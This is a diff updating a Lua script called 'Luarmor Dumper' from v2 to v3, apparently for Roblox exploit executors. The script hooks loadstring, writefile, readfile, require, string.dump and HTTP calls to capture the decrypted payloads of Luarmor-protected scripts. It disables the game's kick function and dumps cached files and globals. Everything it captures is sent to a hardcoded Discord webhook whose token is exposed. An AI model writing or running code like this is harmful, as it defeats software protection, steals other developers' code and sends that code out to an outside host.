@@ -1,6 +1,6 @@
 --[[
-    Luarmor Dumper v2
-    Hooks loadstring + all HTTP methods to capture decrypted payload
+    Luarmor Dumper v3
+    Deep hooks — captures VM output, writefile, environment dumps
 ]]
 
 local WEBHOOK = "https://discord.com/api/webhooks/1512685201141272736/0i_pKRKISAT_DUXh6IuauiL4S9ZDsmz-xgv-kIXYBjjkScVG51e2iTgf_HsHaUJu-3Of"
@@ -23,120 +23,42 @@ local function saveFile(name, content)
     end)
 end
 
--- HOOK 1: loadstring
+-- HOOK 1: loadstring (main capture)
 local oldLoadstring = loadstring
 loadstring = function(code, name)
-    if code and type(code) == "string" and #code > 100 then
+    if code and type(code) == "string" and #code > 50 then
         local dumpName = name or ("ls_" .. tick():gsub("%.", ""))
         saveFile(dumpName, code)
-        send("[LOADSTRING] " .. dumpName .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1500))
+        send("[LOADSTRING] " .. dumpName .. " (" .. #code .. " bytes)\n" .. code:sub(1, 1800))
     end
     return oldLoadstring(code, name)
 end
 
--- HOOK 2: game:HttpGet / game:HttpGetAsync / HttpService:RequestAsync
-pcall(function()
-    local HttpService = game:GetService("HttpService")
-    
-    -- Try hooking game:HttpGet (might not exist in all executors)
-    pcall(function()
-        local oldHttpGet = game.HttpGet
-        if oldHttpGet then
-            game.HttpGet = function(self, url, ...)
-                local result = oldHttpGet(self, url, ...)
-                if result and type(result) == "string" and #result > 100 then
-                    local safeName = url:gsub("[^%w]", "_"):sub(1, 50)
-                    saveFile("http_" .. safeName, result)
-                    send("[HTTP_GET] " .. url .. " (" .. #result .. " bytes)\n" .. result:sub(1, 1500))
-                end
-                return result
-            end
+-- HOOK 2: writefile (capture cached scripts)
+if writefile then
+    local oldWritefile = writefile
+    writefile = function(path, content)
+        if content and type(content) == "string" and #content > 50 then
+            send("[WRITEFILE] " .. path .. " (" .. #content .. " bytes)\n" .. content:sub(1, 1800))
+            saveFile("written_" .. path:gsub("[/\\]", "_"), content)
         end
-    end)
-    
-    -- Try hooking game:HttpGetAsync
-    pcall(function()
-        local oldHttpGetAsync = game.HttpGetAsync
-        if oldHttpGetAsync then
-            game.HttpGetAsync = function(self, url, ...)
-                local result = oldHttpGetAsync(self, url, ...)
-                if result and type(result) == "string" and #result > 100 then
-                    local safeName = url:gsub("[^%w]", "_"):sub(1, 50)
-                    saveFile("async_" .. safeName, result)
-                    send("[HTTP_ASYNC] " .. url .. " (" .. #result .. " bytes)\n" .. result:sub(1, 1500))
-                end
-                return result
-            end
-        end
-    end)
-    
-    -- Hook HttpService:RequestAsync
-    pcall(function()
-        local oldRequestAsync = HttpService.RequestAsync
-        HttpService.RequestAsync = function(self, opts)
-            local result = oldRequestAsync(self, opts)
-            if result and result.Body and #result.Body > 100 then
-                local url = opts and opts.Url or "unknown"
-                local safeName = url:gsub("[^%w]", "_"):sub(1, 50)
-                saveFile("req_" .. safeName, result.Body)
-                send("[REQUEST] " .. url .. " (" .. #result.Body .. " bytes)\n" .. result.Body:sub(1, 1500))
-            end
-            return result
-        end
-    end)
-end)
-
--- HOOK 3: Global HTTP functions (http_request, request, syn.request)
-pcall(function()
-    if http_request then
-        local old = http_request
-        http_request = function(opts)
-            local result = old(opts)
-            if opts and opts.Url and opts.Url:find("luarmor") then
-                send("[HTTP_REQ] " .. opts.Url .. " method=" .. (opts.Method or "?"))
-                if result and result.Body and #result.Body > 100 then
-                    saveFile("hreq_" .. opts.Url:gsub("[^%w]", "_"):sub(1, 50), result.Body)
-                    send("[BODY] " .. #result.Body .. " bytes\n" .. result.Body:sub(1, 1500))
-                end
-            end
-            return result
-        end
+        return oldWritefile(path, content)
     end
-end)
+end
 
-pcall(function()
-    if request then
-        local old = request
-        request = function(opts)
-            local result = old(opts)
-            if opts and opts.Url and opts.Url:find("luarmor") then
-                send("[REQ] " .. opts.Url)
-                if result and result.Body and #result.Body > 100 then
-                    saveFile("req2_" .. opts.Url:gsub("[^%w]", "_"):sub(1, 50), result.Body)
-                end
-            end
-            return result
+-- HOOK 3: readfile (capture cached reads)
+if readfile then
+    local oldReadfile = readfile
+    readfile = function(path)
+        local result = oldReadfile(path)
+        if result and type(result) == "string" and #result > 200 then
+            send("[READFILE] " .. path .. " (" .. #result .. " bytes)")
         end
+        return result
     end
-end)
+end
 
-pcall(function()
-    if syn and syn.request then
-        local old = syn.request
-        syn.request = function(opts)
-            local result = old(opts)
-            if opts and opts.Url and opts.Url:find("luarmor") then
-                send("[SYN_REQ] " .. opts.Url)
-                if result and result.Body and #result.Body > 100 then
-                    saveFile("syn_" .. opts.Url:gsub("[^%w]", "_"):sub(1, 50), result.Body)
-                end
-            end
-            return result
-        end
-    end
-end)
-
--- HOOK 4: Hook metamethods (for namecall-based HttpGet)
+-- HOOK 4: HttpGet via __namecall
 pcall(function()
     if hookmetamethod and getnamecallmethod then
         local oldNamecall
@@ -147,9 +69,8 @@ pcall(function()
                 local url = args[1] or "unknown"
                 local result = oldNamecall(self, ...)
                 if result and type(result) == "string" and #result > 100 then
-                    local safeName = tostring(url):gsub("[^%w]", "_"):sub(1, 50)
-                    saveFile("nc_" .. safeName, result)
-                    send("[NAMECALL_" .. method .. "] " .. url .. " (" .. #result .. " bytes)\n" .. result:sub(1, 1500))
+                    send("[HTTP_" .. method .. "] " .. url .. " (" .. #result .. " bytes)")
+                    saveFile("http_" .. tostring(url):gsub("[^%w]", "_"):sub(1, 50), result)
                 end
                 return result
             end
@@ -158,8 +79,98 @@ pcall(function()
     end
 end)
 
-send("=== Luarmor Dumper v2 Active ===\nHooks: loadstring, HttpGet, HttpGetAsync, RequestAsync, http_request, request, syn.request, __namecall\nWaiting for payload...")
+-- HOOK 5: Hook all global functions that could execute code
+local oldRequire = require
+require = function(module, ...)
+    local result = oldRequire(module, ...)
+    if type(result) == "string" and #result > 100 then
+        send("[REQUIRE] " .. tostring(module) .. " (" .. #result .. " bytes)")
+        saveFile("require_" .. tostring(module):gsub("[^%w]", "_"), result)
+    end
+    return result
+end
 
-print("[Dumper v2] All hooks installed!")
-print("[Dumper v2] Now run the Luarmor loadstring.")
-print("[Dumper v2] Results → Discord webhook + luarmor_dump/ folder")
+-- HOOK 6: string.dump (bytecode dump)
+local oldStringDump = string.dump
+string.dump = function(fn, strip)
+    local result = oldStringDump(fn, strip)
+    if result and #result > 100 then
+        send("[STRING_DUMP] " .. #result .. " bytes")
+        saveFile("dump_" .. tick():gsub("%.", ""), result)
+    end
+    return result
+end
+
+-- HOOK 7: getfenv dump (capture environment changes)
+local originalEnv = getfenv()
+local envChecked = false
+
+-- HOOK 8: Anti-kick (prevent Luarmor from kicking)
+pcall(function()
+    local Players = game:GetService("Players")
+    local oldKick = Players.LocalPlayer.Kick
+    Players.LocalPlayer.Kick = function(self, msg)
+        send("[KICK_BLOCKED] " .. tostring(msg))
+        -- Don't actually kick
+    end
+end)
+
+-- HOOK 9: Capture new globals after VM runs
+task.spawn(function()
+    task.wait(20) -- Wait for VM to execute
+    local newEnv = getfenv()
+    for key, value in pairs(newEnv) do
+        if originalEnv[key] == nil and type(value) == "function" then
+            send("[NEW_GLOBAL] " .. key .. " = function")
+            -- Try to dump the function
+            pcall(function()
+                local dump = string.dump(value)
+                saveFile("global_" .. key, dump)
+            end)
+        elseif originalEnv[key] == nil and type(value) == "string" and #value > 50 then
+            send("[NEW_GLOBAL] " .. key .. " = string (" .. #value .. " bytes)\n" .. value:sub(1, 500))
+            saveFile("global_" .. key, value)
+        elseif originalEnv[key] == nil and type(value) == "table" then
+            send("[NEW_GLOBAL] " .. key .. " = table")
+        end
+    end
+    
+    -- Also check _G and shared
+    pcall(function()
+        for key, value in pairs(_G) do
+            if type(value) == "string" and #value > 200 then
+                send("[_G] " .. key .. " = string (" .. #value .. " bytes)\n" .. value:sub(1, 1500))
+                saveFile("g_" .. key, value)
+            elseif type(value) == "function" then
+                pcall(function()
+                    local dump = string.dump(value)
+                    if #dump > 100 then
+                        send("[_G] " .. key .. " = function (" .. #dump .. " bytes bytecode)")
+                        saveFile("g_" .. key, dump)
+                    end
+                end)
+            end
+        end
+    end)
+    
+    -- Dump static_content folder
+    pcall(function()
+        if isfolder("static_content_130525") then
+            local files = listfiles("static_content_130525")
+            for _, file in ipairs(files) do
+                local content = readfile(file)
+                if content and #content > 200 then
+                    send("[CACHE] " .. file .. " (" .. #content .. " bytes)\n" .. content:sub(1, 1800))
+                    saveFile("cache_" .. file:gsub("[/\\]", "_"), content)
+                end
+            end
+        end
+    end)
+end)
+
+send("=== Luarmor Dumper v3 Active ===\nHooks: loadstring, writefile, readfile, __namecall, require, string.dump, anti-kick\nGlobal dump in 20s...\nWaiting for payload...")
+
+print("[Dumper v3] All hooks installed!")
+print("[Dumper v3] Anti-kick enabled")
+print("[Dumper v3] Global dump in 20 seconds")
+print("[Dumper v3] Now run the Luarmor loadstring")
